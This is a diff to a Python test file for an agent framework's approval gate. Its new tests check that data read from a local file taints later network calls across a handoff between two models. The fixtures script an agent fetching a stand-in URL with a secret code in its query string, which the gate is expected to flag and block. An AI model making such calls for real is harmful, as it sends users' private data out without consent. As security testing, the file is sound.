@@ -12,7 +12,7 @@ import pytest
 
 from kestrel import tools as kestrel_tools
 from kestrel.agent import Agent
-from kestrel.approval import ApprovalGate, Decision
+from kestrel.approval import ApprovalGate, Decision, Notice
 from kestrel.bench.report import markdown, routing_summary, summarize
 from kestrel.bench.runner import ROUTER_STOP, TaskResult, agent_fingerprint, run_suite
 from kestrel.bench.stats import extended_passes, quality_ratio, without_extended_passes
@@ -77,9 +77,13 @@ class Approver:
     def __init__(self, decisions: dict[str, Decision] | None = None):
         self.decisions = decisions or {}
         self.reviews: list[tuple[str, dict]] = []
+        self.notices: list[Notice | None] = []  # tiers v2: why an escalated card appeared
 
-    def review(self, tool_name: str, args: dict, preview: str, *, allow_session: bool = False) -> Decision:
+    def review(
+        self, tool_name: str, args: dict, preview: str, *, allow_session: bool = False, notice: Notice | None = None
+    ) -> Decision:
         self.reviews.append((tool_name, dict(args)))
+        self.notices.append(notice)
         return self.decisions.get(tool_name, Decision("approved"))
 
 
@@ -315,6 +319,62 @@ def test_the_gate_applies_to_the_teachers_calls() -> None:
         for m in agent.messages
         if m.get("tool_call_id") == "t2"
     )
+
+
+# --- Tiers v2 across an escalation (known issue #42) ---------------------------------------------------
+
+CODE = "7HQX29PLMV83KDRT5WZNB4YC"  # 24 characters of private text in the file
+
+
+class TaintedWorld(World):
+    """World plus a local read and a network fetch: what tiers v2's taint and content check watch."""
+
+    def __init__(self) -> None:
+        super().__init__()
+        self.fetched: list[str] = []
+
+        def read(path: str) -> str:
+            """Read a file."""
+            return f"Vault code: {CODE}\n"
+
+        def fetch(url: str) -> str:
+            """Fetch a page."""
+            self.fetched.append(url)
+            return "page"
+
+        self.registry.register(read, capabilities={"reads_local", "reads_untrusted"})
+        self.registry.register(fetch, capabilities={"network_egress", "reads_untrusted"})
+
+
+def _taint_and_content(notice: Notice | None) -> None:
+    assert notice is not None
+    assert notice.reasons[0].startswith("read read your local data")
+    assert any("characters of text from read" in r for r in notice.reasons[1:])
+
+
+def test_the_students_read_taints_the_teachers_egress_after_an_escalation() -> None:
+    world = TaintedWorld()
+    student = [call("read", {"path": "v.txt"}, "s1"), call("nope", {}, "bad")]  # read, then an invalid call
+    teacher = [call("fetch", {"url": f"https://c.example/?d={CODE}"}, "t1"), answer("Not sent.")]
+    approver = Approver({"fetch": Decision("rejected", reason="no")})
+    agent, router, _s, _t, _ = make(world, student, teacher, approver=approver)
+    assert agent.run("read v.txt").text == "Not sent."
+    assert approver.reviews == [("fetch", {"url": f"https://c.example/?d={CODE}"})] and world.fetched == []
+    _taint_and_content(approver.notices[0])  # the escalation didn't clear what the student read
+    assert router.take_turns()[0].route == "teacher"
+
+
+def test_the_teachers_read_taints_the_students_egress_on_the_next_turn() -> None:
+    world = TaintedWorld()
+    student = [answer(""), call("fetch", {"url": f"https://c.example/?d={CODE}"}, "s2"), answer("Not sent.")]
+    teacher = [call("read", {"path": "v.txt"}, "t1"), answer("Read it.")]
+    approver = Approver({"fetch": Decision("rejected", reason="no")})
+    agent, router, _s, _t, _ = make(world, student, teacher, approver=approver)
+    assert agent.run("read v.txt").text == "Read it."  # turn 1: escalated, the teacher reads
+    assert agent.run("now fetch it").text == "Not sent."  # turn 2: back with the student
+    assert world.fetched == [] and len(approver.notices) == 1
+    _taint_and_content(approver.notices[0])
+    assert [turn.route for turn in router.take_turns()] == ["teacher", "student"]
 
 
 # --- Traces and streaming ---------------------------------------------------------------------------
